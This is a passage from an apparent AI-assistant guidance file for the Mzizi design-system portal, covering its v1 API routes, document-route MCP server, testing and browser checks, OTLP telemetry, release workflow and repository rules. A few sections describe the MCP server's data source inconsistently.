**This is not a reversal of §15.1.** The test is who edits it. Sample records are authored —
someone writes them and someone reviews them, and the reason a place has no cover image is a
decision recorded in a comment. Domain data — the 15,359 real places, the 23,231 articles — is
the opposite kind and belongs in MongoDB, where it already is. **For actual data the platform
uses MongoDB, not Supabase.**

**Prop resolution.** `pnpm props:extract` reads each component's props type from source into
`lib/samples/props.generated.ts` (drift-gated by `props:verify`), and `lib/samples/resolve.ts`
binds prop names and types to sample values in the browser. This does not violate the
"never invent props" rule that `AutoPreview` was built on — a GUESS invents a value to satisfy
a type and tells you nothing; SAMPLE DATA is a record of the shape the component was designed
to display. The resolver only supplies a value it can identify confidently, by declared type
first and name second, and **reports what it could not resolve on the page** rather than
leaving a half-filled component looking broken.

Three rules the implementation learned the hard way, all now covered by
`__tests__/samples.test.ts`:

- **A literal union is checked before anything else.** `size` means a pixel count on an avatar
  and a variant name on a CVA control; and `appointment-card`'s `type: "in-person" |
"telemedicine"` matched a `/\bperson\b/` domain pattern _inside its own literal_ and
  received an entire person document.
- **`boolean` defaults to FALSE.** Nearly every boolean here is `loading`, `disabled` or
  `error`; defaulting to true made every component with a `loading` prop render grey bars.
- **There is no generic `string` fallback.** It produced `readTime: "Mana Pools National
Park"`. A prop whose name says nothing and whose type says only "a string" is one this
  cannot resolve, and saying so is the honest answer.

**Never put a clock read or randomness in the sample set.** A fixture that changes between two
renders breaks static prerendering, makes visual diffs noise, and makes a failing test
unreproducible. Dates are fixed ISO strings against `SAMPLE_NOW`.

---

## 9. Mzizi API (v1)

All endpoints are under `/api/v1/` and documented in `openapi.yaml` (OpenAPI 3.1).

All responses include schema.org JSON-LD metadata (`@context`, `@type`) where applicable.

**Common headers:** `Cache-Control: public, max-age=3600, s-maxage=86400`, `Access-Control-Allow-Origin: *` (except `/stats` which is `max-age=60, s-maxage=120` and `/health` which is `no-cache, no-store`).

| Endpoint                                   | Description                                                             | Landed in |
| ------------------------------------------ | ----------------------------------------------------------------------- | --------- |
| `GET /api/v1`                              | Discovery document — lists all resources                                | —         |
| `GET /api/v1/brand`                        | Brand system (minerals, typography, spacing, ecosystem)                 | —         |
| `GET /api/v1/ui`                           | Component registry index                                                | —         |
| `GET /api/v1/ui/{name}`                    | Individual component (shadcn format, with source code)                  | —         |
| `GET /api/v1/rs/{name}`                    | The same component's **Rust (Dioxus)** source; 404 when it has none     | —         |
| `GET /api/v1/samples`                      | Sample-data catalog — the records every preview renders against (§8.10) | —         |
| `GET /api/v1/samples/{type}`               | Sample records: places, entities, persons, events, products, articles   | —         |
| `GET /api/v1/ui/{name}/docs`               | Component docs (use cases, variants, a11y)                              | —         |
| `GET /api/v1/ui/{name}/versions`           | Component version history                                               | —         |
| `GET /api/v1/ecosystem`                    | Architecture principles & framework decision                            | —         |
| `GET /api/v1/data-layer`                   | Local-first + cloud layer specification                                 | —         |
| `GET /api/v1/pipeline`                     | Open data pipeline (Redpanda → Flink → Doris)                           | —         |
| `GET /api/v1/sovereignty`                  | Technology sovereignty assessments                                      | —         |
| `GET /api/v1/architecture`                 | The DNA double helix — nodes, rungs, strands + live counts              | —         |
| `GET /api/v1/architecture/nodes/{n}`       | Per-node detail (covenant, stakeholder, rules) — **`n` is uncapped**    | —         |
| `GET /api/v1/architecture/axes`            | **HTTP 410 Gone** — the axis model is retired; only the helix is served | —         |
| `GET /api/v1/architecture/layers/{n}`      | **HTTP 410 Gone** — retired with the layer era; see `nodes/{n}`         | —         |
| `GET /api/v1/architecture/frontend/axes`   | **HTTP 410 Gone** — retired with the axis model (§6.2)                  | —         |
| `GET /api/v1/architecture/frontend/layers` | **HTTP 410 Gone** — retired with the axis/layer model (§6.2)            | —         |
| `GET /api/v1/ubuntu/pillars`               | 5 Ubuntu Pillars                                                        | —         |
| `GET /api/v1/ubuntu/principles`            | 5 Ubuntu Principles                                                     | —         |
| `GET /api/v1/docs`                         | **HTTP 410 Gone** — docs are MDX routes, not an API surface             | —         |
| `GET /api/v1/docs/{slug}`                  | **HTTP 410 Gone** — see `/api/v1/docs` for the slug map                 | —         |
| `GET /api/v1/changelog`                    | All releases (from `changelog` table)                                   | #107      |
| `GET /api/v1/changelog/{version}`          | Single release                                                          | #107      |
| `GET /api/v1/ai/instructions`              | List AI instruction sets                                                | —         |
| `GET /api/v1/ai/instructions/{name}`       | Instruction set by target (mcp-server, claude, copilot)                 | —         |
| `GET /api/v1/skills`                       | List published agent skills (lightweight, no body_mdx)                  | —         |
| `GET /api/v1/skills/summary`               | Same shape as `/skills`; reserved for CLI update path                   | —         |
| `GET /api/v1/skills/{name}`                | Single skill with full `body_mdx`                                       | —         |
| `GET /api/v1/search?q=`                    | Cross-resource search (components + docs + changelog)                   | —         |
| `GET /api/v1/stats?days=`                  | Open-data usage metrics (CC BY 4.0) — backs `/observability`            | #105      |
| `GET /api/v1/health`                       | Service health check (`no-cache, no-store`)                             | —         |

Routes outside `/api/v1/` (intentionally not part of the public v1 contract): `GET /api/openapi` (serves `openapi.yaml`), `GET /api/chaos/{name}` (N5 resilience chaos-injection), `GET /api/health/{name}` (per-resource health probe).

**Error responses:** 400 (invalid input), 404 (not found), 410 (gone — `/docs*` and the retired axis routes), 500 (server error), **503** (Supabase env vars missing — clear "Database not configured" message).

**Serve only the DNA double helix.** The axis model is retired and is not served anywhere — not at a route, not nested in a payload, not relabelled. `absence is the correct state for anything axis-shaped, not repair`: emitting strand data through a field named `axis_geometry` would look correct and teach the wrong model to every consumer downstream, which is how the drift started. The retired routes above return 410 with a `migrated_to` map, matching the `/api/v1/docs*` precedent. `lib/db`'s `getAxesSummary` / `getArchitectureFrontendAxes` / `getArchitectureFrontendLayers` / `getArchitectureSnapshot` / `getLayerDetail` / `getNodeDistribution` helpers, the `ArchitectureSnapshotAxis` / `ArchitectureSnapshotLayer` / `AxisSummaryRow` / `LayerDetailRow` / `ArchitectureAxisGeometry` types, `ChangelogRow.axes_affected`, and the `FrontendAxis` / `FrontendLayer` OpenAPI schemas are deleted rather than deprecated.

**`layers` was retired too, and "URL stability" is not a reason to keep it.** `/api/v1/architecture/layers/{n}` served an `axis_name` per row behind a `1-10` bound; it is now 410, replaced by `/api/v1/architecture/nodes/{n}`. It was briefly kept as a stable alias that "serves nodes", and that is precisely how the vocabulary survived a migration — do not reinstate it. The **site** path `/architecture/layers/:n` is a permanent redirect to `/architecture/nodes/:n` (`next.config.mjs`), because the unit did not change, only its name.

**Never cap the node set.** Node numbers are labels, not a sequence, and more nodes will come. Do not write a fixed count ("ten nodes"), a fixed range (`N1-N10`), a `VALID_NODES` array, or a `maximum` on a node argument anywhere — in a route, an OpenAPI schema, `generateStaticParams`, a chart legend, or prose. **Any upper bound is itself the defect, not its current value:** a cap of 10 hid N11, and a cap of 11 would hide N12. Derive the set from `documentation-architecture-nodes` and let a missing number be a 404 the collection answers, never a 400 a constant answers. **This includes the MCP tool surface** — `list_components`'s `node` argument is `z.number().int().positive()` with no `.max()`, because a Zod bound rejects the filter before it reaches the store, so an agent asking for N11 got a schema error instead of an answer. An unknown node legitimately returns zero rows. `__tests__/api/v1/architecture-routes.test.ts` asserts this against both the OpenAPI schema and `lib/mcp-server.ts`.

**`public/llms.txt` is a doctrine surface.** It is the machine-readable summary AI crawlers read, so a stale claim there propagates further than one on a page. It may _name_ the retired model in order to disown it — the test that guards it asserts per-paragraph that any paragraph mentioning axes also marks them retired, rather than banning the words, so the disavowal does not trip its own check.

The OpenAPI document is also served at `GET /api/openapi`.

---

## 10. MCP Server (document-route)

The portal runs the **Mzizi MCP server** at `/mcp` via Streamable HTTP transport — a **lean document-route MCP** that reads from `component_documents` and returns whole-document responses.

### Setup

The MCP server is a Next.js API route at `app/mcp/route.ts`, powered by `lib/mcp-server.ts` (`createMziziMcpServer()` — it takes NO Supabase client; it reads `registry.json` + the files on disk).

Configured in `.claude/settings.json`:

```json
{
  "mcpServers": {
    "mzizi": {
      "type": "url",
      "url": "https://mzizi.dev/mcp"
    }
  }
}
```

**Endpoint:** `POST /mcp` (JSON-RPC), `GET /mcp` (SSE), `DELETE /mcp` (cleanup), `OPTIONS /mcp` (CORS preflight)

### Auth model — there is nothing to authenticate to

The MCP no longer reaches a database at all, so this section's old
`createSupabaseContext(request, { auth: 'none' })` dance is gone with it. The factory
reads `registry.json` and the component files on disk, both of which are in the deployed
bundle:

```typescript
const server = await createMziziMcpServer()
```

That is the point of the migration, not a simplification of it. An anon Supabase client
was the narrowest credential available, but it was still a network hop to a store that
could be unreachable, stale, or return a different answer than `/api/v1/ui/{name}` served
from the same request. Reading the bundle makes the MCP and the HTTP API answer from one
source by construction rather than by convention, and removes the class of bug where a
component was visible over MCP and invisible over HTTP (which is exactly what happened to
249 of them).

### Resources (read-only data)

| URI                  | Description                                                                                            |
| -------------------- | ------------------------------------------------------------------------------------------------------ |
| `mzizi://components` | Mzizi component registry index — name / node / collection / owner per row                              |
| `mzizi://nodes`      | Per-node collection summary — counts + ownership breakdown across every node/rung the collection holds |

### Tools (callable actions)

| Tool                  | Description                                                                                                                                                                                     |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `list_components`     | List components, optionally filtered by node (**uncapped** — see §9) or owner (`bundu` / `nyuchi` / `mzizi` / `framework`). Returns the lean index — use `get_component` for the full document. |
| `get_component`       | Fetch one component as its full JSON document — one read, everything (metadata, owner, sources/descriptors, legacy source code, files, docs)                                                    |
| `list_collections`    | List the per-node collections (`n1_tokens`, `n2_primitives`, … — never a fixed range) with total counts and ownership breakdown                                                                 |
| `get_database_status` | Supabase connection health + document-store row count                                                                                                                                           |

### Legacy MCP — RETIRED

The previous relational MCP (the wider tool surface that read from `components`, `component_docs`, `brand_*`, `architecture_*`, `ubuntu_*`) has been retired. The `legacy` branch no longer exists and no legacy server is deployed — `design.nyuchi.com` is a domain-level 308 permanent redirect to `mzizi.dev`, so unmigrated consumers pointing at `design.nyuchi.com/mcp` reach the canonical document-route MCP transparently. Do not reference `design.nyuchi.com` in new code or docs.

---

## 11. Component Categories

The stable registry items live in the Supabase `components` table and are organised across the nodes and rungs of the DNA double helix and by function.

**Do not hardcode component counts anywhere in the repo.** Counts change with every registry sync; baking a number into MDX, into doctrine, or into a card guarantees doctrine drift.

The live source of truth is one of:

- `GET /api/v1/stats` (HTTP)
- `get_system_counts()` (SQL helper in Supabase)
- `<LiveComponentCount />` (renderer in `components/live-component-count.tsx`, used in MDX + page bodies)
- MCP `list_collections` (per-node breakdown)

If you genuinely need a category-level list for navigation or doc grouping, derive it at request time (server component or ISR) — never as a hand-edited table.

---

## 12. Notable Configuration

| File                    | Setting                              | Note                                                 |
| ----------------------- | ------------------------------------ | ---------------------------------------------------- |
| `next.config.mjs`       | `typescript.ignoreBuildErrors: true` | TS errors won't fail builds                          |
| `next.config.mjs`       | `images.unoptimized: true`           | No Next.js image optimization                        |
| `next.config.mjs`       | `transpilePackages: ["radix-ui"]`    | Radix UI needs transpilation                         |
| `components.json`       | `style: "new-york"`, `rsc: true`     | shadcn CLI defaults                                  |
| `components.json`       | `iconLibrary: "lucide"`              | Lucide React for all icons                           |
| `tsconfig.json`         | `strict: true`, `target: "ES6"`      | Strict TypeScript                                    |
| `tsconfig.json`         | `paths: { "@/*": ["./*"] }`          | Root-relative imports                                |
| `postcss.config.mjs`    | `@tailwindcss/postcss`               | Tailwind CSS 4 PostCSS plugin                        |
| `.claude/settings.json` | MCP server config                    | Connects Claude Code to URL-based MCP server at /mcp |

---

## 13. Testing

### Test Framework

- **Runner:** Vitest 4.x with jsdom environment
- **Libraries:** @testing-library/react, @testing-library/jest-dom
- **Config:** `vitest.config.ts` with `@` path alias, React plugin, jsdom environment
- **Setup:** `vitest.setup.ts` loads jest-dom matchers

### Test Structure

```
__tests__/
├── playground-routes.test.ts                    # /playground + /playground/[name] route surface
├── api/
│   ├── architecture-routes.test.ts              # architecture route surface
│   ├── brand-route.test.ts                      # /api/v1/brand response, headers, data
│   ├── registry-route.test.ts                   # /api/v1/ui registry integrity
│   └── v1/
│       ├── architecture-routes.test.ts          # route files, no node caps, llms.txt doctrine
│       └── docs-route.test.ts                   # /api/v1/docs* HTTP 410 behaviour
└── components/                                  # component rendering tests
    ├── breadcrumbs.test.tsx
    ├── callout.test.tsx
    ├── dashboard-sidebar.test.tsx
    └── toc.test.tsx
```

### What Tests Cover

- **API routes:** Brand API returns the correct headers/status/payload shape; the registry response matches the shadcn schema; all expected v1 route files exist on disk; removed legacy routes are confirmed gone; `/api/v1/docs*` and the retired axis/layer routes return HTTP 410; `/api/v1/architecture/nodes/{n}` never rejects a high node number.
- **Doctrine:** no node argument in `openapi.yaml` declares a `maximum`; `public/llms.txt` makes no axis-model claim and describes the helix (§9).
- **Portal pages:** `/playground` + `/playground/[name]` exist and render through the playground demo registry.
- **Portal components:** breadcrumbs, callout, dashboard sidebar, and table-of-contents render correctly.

### Running Tests

```bash
pnpm test             # Run all tests once
pnpm test:watch       # Watch mode for development
```

### 13.1 Browser checks — the one thing the offline gates cannot answer

> **Source of truth:** `docs/browser-checks.md`. This is the summary.

`pnpm browser:check` renders pages through Cloudflare **Kitesurf** and asserts
each produced its own content. It exists because `/changelog/{name}` shipped page
chrome with **no article body** while every gate was green: typecheck, lint,
tests and build all passed, and the route answered HTTP 200 with ~140 KB of HTML.
`new Date(undefined).toISOString()` threw inside the article and React swallowed
it into an empty region, with the header, sidebar and footer rendering around the
hole.

A status code and a byte count were both true and both useless. Nothing offline
can close that gap — a unit test renders a component in jsdom, not the deployed
page, and `pnpm build` proves a route compiles, not that it paints.

**It is a `fetch`, not Playwright, and that is a requirement rather than a
preference.** fundi is a Cloudflare Worker and cannot spawn a browser process, so
a local-browser checker would serve developers and be useless to the N9 rung that
most needs it. Browser Run is reachable identically from a laptop, from CI, and
from inside fundi's heal loop — from a Worker via `env.BROWSER.quickAction()`,
which needs no API token at all.

Rules that are easy to get wrong, each one a bug this already shipped:

- **Assert a string, never a length.** A threshold cannot tell content from
  chrome; the first version green-ticked navigation on all five routes.
- **Match the body, never the raw response.** `/markdown` prefixes a YAML block
  built from the page's `<meta>` tags, so an expectation drawn from the
  description passes against a page that rendered nothing.
- **Do not parse the HTML here.** `<main>` on this site wraps the _sidebar_, and
  `/<[^>]+>/g` breaks on Tailwind's `[&>svg]:` attributes. `/markdown` extracts
  in the browser's own context, which is why the script has no dependencies.
- **Kitesurf supports a subset of Quick Actions.** `/markdown`, `/content`,
  `/accessibilityTree` and `/screenshot` work; `/scrape` and `/links` answer
  `Action "…" is not supported by the kitesurf browser`.
- **No colour or contrast assertions.** Kitesurf trades CSS exactness for cost,
  so it cannot gate the APCA floor. Rendered-or-not is what it can answer.

Without `CLOUDFLARE_API_TOKEN` it skips loudly and exits 0 — visibly, never
looking like a green run. It is not in `ci.yml` yet for that reason: a check that
reads as broken on every fork is one everyone learns to ignore.

**It reports through N8, and the protocol is OTLP** — see §13.2.

### 13.2 N8 assurance telemetry — the sink is OpenTelemetry

> **Source of truth:** `docs/n8-telemetry.md`. This is the summary.

N8's covenant is "what breaks is seen before users feel it", and five of its
components (`mzizi-synthetic-probe`, `mzizi-rum`, `mzizi-error-tracker`,
`mzizi-alert-engine`, and the browser check) ended in a callback with **no sink
behind it** — so a signal was seen by whoever installed the component and by
nobody else. `mzizi-otel` is that sink.

**The protocol is OTLP, and that choice is load-bearing: a signal only fundi can
read is a signal only fundi can act on.** A `mzizi.dev/api/assurance` route would
make Mzizi the only possible consumer and require shipping a client for every
service that later wants in. OpenTelemetry is what collectors, backends and agent
runtimes already speak, so an assurance event is subscribable by services this
repo does not know exist.

Rules, each of them a defect that shipped:

- **No default endpoint, ever.** `mzizi-rum` defaulted to
  `https://mzizi.dev/api/rum` — a route that returns **404** and has never
  existed — inside a `catch` that correctly swallows delivery failures. Every
  consumer who installed RUM without setting an endpoint was posting into a void
  that looked exactly like working RUM. Unset now means "do not POST".
- **Telemetry never changes the caller's verdict.** A probe reporting "failed"
  because its collector was unreachable manufactures an incident out of an
  exporter outage. The exporter never throws and returns
  `{ exported: false, reason }`.
- **No `@opentelemetry/*` dependency.** OTLP/HTTP JSON is a documented wire
  format; the SDK assumes a Node runtime and **fundi is a Worker**. A hand-built
  payload runs unchanged in Node, a Worker, Deno and a browser, and keeps the
  component independently installable (§15.6). The cost — no context
  propagation, batching or retry — is stated in the file: this carries discrete
  assurance events, not request traces.
- **`OTEL_EXPORTER_OTLP_ENDPOINT` is a base** (gets `/v1/traces` appended);
  **`OTEL_EXPORTER_OTLP_TRACES_ENDPOINT` is complete** (used verbatim). The
  asymmetry is the spec's; appending to the second yields `/v1/traces/v1/traces`.
- **Wire shape is tested, not eyeballed.** A malformed OTLP body fails silently —
  200 back, span dropped, empty dashboard. `__tests__/lib/otel.test.ts` asserts
  32/16-hex ids, integer **nanosecond strings** (JSON has no int64), typed
  attribute values, and ERROR status on the run plus the failing step only.
- **`mzizi.*` for Mzizi facts.** Mzizi-specific attributes do not squat on OTel
  semantic-convention names.

**Not yet wired, stated plainly:** no collector is configured anywhere in the
ecosystem, so `browser:check` reports `not reported — no OTLP endpoint
configured` today. §17's diagram claims a loop whose RPCs
(`record_observability_event`, `create_fundi_issue`) have **zero call sites in
this repo** — this adds the emitter and the protocol, not the closed loop.

---

## 14. CI/CD & Versioning

### PR & Commit Workflow

**One PR = many commits. Not one-to-one.**

A PR is a logical unit of work. Commits inside the PR are the incremental steps that get there. The PR is what reviewers review, what CI gates, what merges to main. The commits are the paper trail.

**Hard rules:**

- Never split a logical unit of work across multiple PRs just to keep each PR small.
- Never collapse a PR's history into a single commit (no squash-merge).
- Commit messages are part of the documentation.
- Target the ratio at roughly **~10 commits per PR**.
- A PR does not ship until it is **100% right end-to-end**.
- Exceptions to bundle-per-PR: security fixes, CI unblocks, and genuinely orthogonal infrastructure changes get their own PRs because their merge order is independent.

### GitHub Actions

Three workflows in `.github/workflows/`:

**`ci.yml`** — Runs on every push to `main` and all PRs:

1. **Lint** — `pnpm lint`
2. **Type Check** — `pnpm typecheck`
3. **Test** — `pnpm test`
4. **Build** — `pnpm build` (runs after lint, typecheck, test pass)

**`claude-review.yml`** — AI code review on every PR and `@claude` mentions:

- Triggers on PR open/sync, issue comments, review comments, and reviews
- Uses `anthropics/claude-code-action@v1` preceded by `actions/checkout@v6` with `fetch-depth: 0`
- Reviews for: code quality, design system adherence, accessibility, security, registry compatibility
- Secret required: `CLAUDE_CODE_OAUTH_TOKEN`

**`release.yml`** — Runs on version tags (`v*`):

1. Validates (lint + typecheck + test + build)
2. Verifies tag version matches `package.json` version
3. Creates a GitHub release with auto-generated release notes

### Versioning

- **Current version:** 1.0.0 (must match in `package.json`, `lib/mcp-server.ts` (`VERSION` const), the `changelog` table in Supabase, `components/landing/footer.tsx`, `components/landing/dashboard-sidebar.tsx`, `app/layout.tsx` (`softwareVersion`), `README.md`, and CLAUDE.md §1)
- **Scheme (two independent tracks — do not conflate):**
  - **Code SemVer** — the portal codebase versioned in `package.json` et al. **`1.0.0` is the first public release** of the Mzizi code. The prior `4.1.x` line was the internal pre-1.0 iteration; the portal is not published to npm, so resetting to `1.0.0` carries no backwards-version conflict. The next code major (`2.0.0`) is a maintainers' call.
  - **Doctrine / IP line** — the design-system doctrine and tooling IP, currently at **v5**. This is the intellectual-property version (doctrine + Mzizi tooling maturity), tracked in the Supabase doctrine/`changelog` metadata, and is deliberately **decoupled** from the code SemVer. A code release bumps the SemVer; a doctrine revision bumps the IP line. (Component tokens still carry their own `doctrineVersion`, e.g. `4.2.0`, orthogonal to both.)
- **Release process:**
  1. Update version in `package.json`
  2. Update the `VERSION` constant in `lib/mcp-server.ts`
  3. Update the footer version in `components/landing/footer.tsx` and the sidebar version in `components/landing/dashboard-sidebar.tsx`
  4. Update `softwareVersion` in `app/layout.tsx`
  5. Update the version line in `README.md` and CLAUDE.md §1
  6. Insert a row into the `changelog` Supabase table for the new version (via `apply_migration`)
  7. Commit, push, open PR; merge with `merge_method=merge` (never squash)
  8. Tag and push the tag; GitHub Actions verifies and creates the release

### Dependency Management — Upgrade-First Policy

**This registry is the testing ground for major version upgrades.** All dependency upgrades happen here FIRST, before touching any production app.

1. Upgrade here first — always update to the latest version, including major versions
2. Run all CI gates — lint, typecheck, test, build must all pass
3. If breaking changes exist — fix them here in the registry components
4. If unfixable — roll back here before it ever touches production
5. Once passing — production apps can safely upgrade

### Pre-commit Gates

`.husky/pre-commit` runs three steps:

| Gate                       | Command                                                              | Failure means                                               |
| -------------------------- | -------------------------------------------------------------------- | ----------------------------------------------------------- |
| **Lint + format (staged)** | `pnpm exec lint-staged` (eslint --max-warnings=0 + prettier --write) | ESLint warning/error or unformatted code                    |
| **Type check (project)**   | `pnpm typecheck`                                                     | TypeScript error                                            |
| **Security audit**         | `pnpm audit --audit-level=moderate --ignore-registry-errors`         | Unresolved vulnerability — update deps or add pnpm override |

CI additionally runs `pnpm test`, `pnpm build`, `pnpm registry:verify`, and `pnpm registry:validate`.

### Deployment

- **Platform:** Vercel (`mzizi.dev`); automatic deploys from `main`
- **CI gates:** Security audit, lint (zero warnings), typecheck, tests, build, and `registry:verify` must all pass before merge
- **Search index:** the `postbuild` step runs Pagefind against `.next/server/app` and writes the static index into `public/_pagefind/`

---

## 15. LLM Instructions

When working on this codebase as an AI assistant:

1. **Git owns what humans author; Supabase owns what machines generate or accumulate.** That is the rule, and it replaces "Supabase is the source of truth for everything except component source" — which was true when component source was the only exception and is now wrong for three whole classes.

   **Git:** component source under `components/registry/n<N>-<label>/` (§8.3); doctrine + long-form docs under `content/doctrine/` and `app/` as MDX (§15.17); skills in `nyuchi/mzizi-tools` (§15.23).

   **Supabase:** component metadata and the `components` view (§6.1), brand tokens, `changelog`, and the observability / chaos / fundi event streams.

   The test is _who edits it_. A JSON column is invisible to tsc, eslint, prettier and a reviewer, so anything a person writes and another person should check belongs in a file where the toolchain and a diff can see it. Anything generated by a script, bumped by a release, or appended by telemetry belongs in the database. See §8.3 and `docs/component-source-migration.md`.

2. **`registry.json` is AUTHORED, not generated** — this reverses the old rule. It holds the only copy of each component's documented contract (`meta`: use cases, variants, sizes, features, a11y, owner, collection), so editing it IS the workflow. `pnpm registry:normalize` canonicalises its formatting; `pnpm registry:validate` proves every item still installs.
3. **Never break the shadcn registry schema** — downstream apps depend on it.
4. **Use the Seven African Minerals palette** (plus heritage / status / experimental sets — §7) — never introduce colors outside the token system.
5. **Follow the CVA + Radix + cn() pattern** — every component uses this stack.
6. **Keep components self-contained** — each file is independently installable via the registry.
7. **Preserve accessibility** — APCA 3.0 AAA contrast, the dense control scale with adequate hit area on touch surfaces (§8.2), Radix primitives for keyboard/screen reader behaviour.
8. **Test API output** — after modifying a component, verify it serves correctly via `/api/v1/ui/[name]`.
9. **Use the MCP server** — served at `/mcp` via `lib/mcp-server.ts` (`createMziziMcpServer()`); it reads `registry.json` + the component files on disk, NOT `component_documents` and not any database. The legacy relational MCP is retired; `design.nyuchi.com` is a 308 redirect to `mzizi.dev`.
10. **All brand wordmarks lowercase** — `mzizi`, `mukoko`, `nyuchi`, `shamwari`, `bundu`, `nhimbe`.
11. **This is the canonical design system** — changes here propagate to all bundu ecosystem apps.
12. **Run tests before committing** — `pnpm test` must pass; add tests for new behaviour, especially around API routes.
13. **Keep versions in sync** — `package.json`, `lib/mcp-server.ts` (`VERSION`), the `changelog` Supabase row, `components/landing/footer.tsx`, `components/landing/dashboard-sidebar.tsx`, `app/layout.tsx` (`softwareVersion`), `README.md`, and CLAUDE.md §1.
14. **The mineral strip uses 5 mineral colors** and is always vertical (left-edge accent only).
15. **Use the MCP server** — served at `/mcp` via `lib/mcp-server.ts` (`createMziziMcpServer`); reads `component_documents` only. The legacy relational MCP is retired; `design.nyuchi.com` is a 308 redirect to `mzizi.dev`.
16. **Resilience patterns** (circuit-breaker, retry, timeout, fallback-chain, ai-safety, chaos) are vendored in `lib/` and also published as `registry:lib` items in Supabase. Consumer apps install them via the shadcn CLI.
17. **Mzizi's long-form documentation AND its doctrine live IN this repo, as MDX.** Authored as `.mdx` files, compiled by `@next/mdx`. Prose pages go under `app/` and are routed by Next.js's file-based router; **doctrine** — the helix nodes and strands, architecture principles, sovereignty assessments, Ubuntu pillars and principles, bundu conventions, AI instructions — lives under `content/doctrine/<collection>/<slug>.mdx` as YAML frontmatter plus body, extracted by `pnpm doctrine:extract` and drift-gated by `pnpm doctrine:verify`. This is the doctrine N10 `documentation` states, and it is **final**.

    **This widens an earlier, narrower version of this rule**, which said the database stayed the source of truth for _structured_ data and moved only prose. That split does not survive contact with the actual rows: a node document is mostly structured fields and its load-bearing content is still prose — a covenant, a role, four implementation rules — and holding it in a JSON column is what let N12 ship with N10's `role`, N10's `stakeholder`, N10's four implementation rules and N10's entire `rust` block, describing itself as the documentation rung. Every one of those was invisible until the rows became files. Frontmatter keeps the structure queryable; being a file is what makes the content reviewable.

    **Still database-owned:** components + their metadata (§6.1), tokens, `changelog`, and the observability/chaos event streams. Those are either generated, high-churn release state, or append-only telemetry — none of which a human edits in a pull request.

    This **reverses** the earlier "docs live outside this repo" rule, which sent Mzizi's own long-form content to the sibling Starlight sites. Both directions were written down at once for a while — this file said "outside", the N10 rung document said "in the repo" — and a contradiction in the canonical file is worse than either answer, because agents read whichever they reach first.

    **Why in-repo wins:** an MDX page passes through the build. A page that references a component that no longer exists, or a route that has moved, fails `pnpm build` — so documentation drift becomes a build error rather than a thing someone notices months later. That guarantee is not available to prose held in a separate site or in a database table.

    **Current state, stated plainly: there are ZERO `.mdx` files in this repo today.** The toolchain is wired (`next.config.mjs` compiles `.mdx` under `app/`) but no page has been authored, and there is no `app/docs/` directory. So this rule describes where docs go from here, and the content still has to be written or brought back. Do not read the rule as a description of what is already there.

    **Unaffected by this reversal:** `/api/v1/docs/*` stays HTTP 410 and `get_documentation_page` stays gone — MDX pages are routes, not an API surface, so nothing here asks for those back. The `documentation_pages` Supabase table stays historical; author MDX, not rows. The `changelog` table is untouched and remains the source of truth for the release-bump workflow. `nyuchi/bundu-docs` and `nyuchi/nyuchi-docs` continue to exist for their own scopes — what changed is that **Mzizi's** long-form docs are no longer theirs to hold.

18. **The playground (`components/playground/`) reads from the API**, not from local files.
19. **API is versioned under `/api/v1/`** — `openapi.yaml` is the contract; update it whenever a route or schema changes.
20. **Buttons are always pill-shaped (`rounded-full`)** across the entire ecosystem.
21. **Security findings are never deferred.** Any vulnerability surfaced during a `/security-review`, a manual audit, a CodeQL alert, a Dependabot advisory, or `pnpm audit` must be fixed inside the current PR — even if the original PR scope is "docs only". The only acceptable exception is when the fix concretely requires infrastructure that isn't available on the PR's branch; in that case, document the gap in `SECURITY.md`, open a tracking issue, AND still ship every code-level mitigation that doesn't require the missing infrastructure.

22. **No known bugs are ever deferred to a follow-up PR.** This is the canonical design system for the bundu ecosystem — every consumer app inherits whatever ships from `main`.

    **A known bug means:** any verified-broken behaviour, any documented contract the code does not honour (e.g. a URL pattern documented in MDX that returns 404, a type/interface name promised in doctrine that doesn't exist), any dependency-version drift that breaks links/state in production, any runtime error path that has been reproduced.

    **NOT bugs (can ship as separate PRs):** unbuilt features documented as `(planned)`; quality work without a runtime symptom; enhancements to surfaces that already function; parallel-track work explicitly carved out by another doctrine section.

    **The audit gate before merge.** Every PR runs through (1) `/security-review`, (2) a gap analysis against this CLAUDE.md, and (3) a sweep of open GitHub issues. Anything matching the bug definition above lands in the same PR — re-scope rather than defer.

23. **Skills are authored in `nyuchi/mzizi-tools`, not here — and they no longer live in the database at all.** The source of truth is git: `mzizi-skills/skills/<name>/SKILL.md` in that repo, published as the public npm package `@nyuchi/mzizi-skills`. Consumers install with `npx skills add @nyuchi/mzizi-skills`.

    **The `skills` DB projection is retired.** `mzizi-tools` used to run `pnpm skills:sync` to copy the committed bundle into the Supabase `skills` collection so this repo could serve it. That made three copies of every skill — the git file, the `skills` collection, and a standalone `skills` table — for no gain, since git was already authoritative. A projection nobody may edit is not a source of truth; it is a cache that can only ever be stale, and `skills:check` reporting drift was the symptom. Skills are files, and §6.1's rule applies: prefer no database at all where the answer is a file.

    **This reverses the earlier "authored once in Supabase" model.** To change a skill, open a PR against `nyuchi/mzizi-tools` — never edit the Supabase row directly, never edit a published copy, and never re-add skill `.md` files to this repo. The portal's own `scripts/sync-skills.ts` (which pulled DB → disk, into a `packages/design-agent-skills/` directory that no longer exists) has been removed along with the `skills:sync` / `skills:verify` scripts: it wrote in the opposite direction to the `mzizi-tools` script, so with both present the `skills` collection was won by whichever ran last. `.claude/skills/` in this repo is now reserved for skills specific to working on the portal codebase itself, and holds none today. See `.claude/skills/README.md`.

24. **Mzizi vs Mukoko vs Nyuchi vs Bundu — keep the split clean.**
    - **Bundu Foundation** owns Mzizi (governance); Mzizi serves the open DNA-helix architecture, the component registry, and the brand system.
    - **Mukoko** is the consumer family (super app + mini-apps); apps consume Mzizi but live in their own repos.
    - **Nyuchi** is the enterprise operator; the Nyuchi Console (`nyuchi/mukoko-platform`, future `nyuchi-console`) surfaces Mzizi via the `mzizi-console-app` package.
    - **Mzizi tooling** (Fundi agent, MCP transport, SDK, skills bundle, console mini-app) lives in `nyuchi/mzizi-tools` — not in this repo. The portal owns the **canonical** `/mcp` HTTP endpoint and the `/api/v1/*` surface; everything else is downstream.

### Open work to be aware of

Active issues to keep on the radar (live from the `nyuchi/design-portal` issue tracker):

- **#99** — Sovereignty rule: explicit per-technology assessment in doctrine
- **#98** — Tri-mode architecture: Musha / Basa / Nhaka as a doctrine rule
- **#97** — Open data framework: four-category model as doctrine spine + Nhaka
- **#86** — Hyperdrive for Supabase (perf optimisation, not a prerequisite)
- **#83** — Registry-driven API endpoints + CLI auto-update from `mcp_tool_registry`
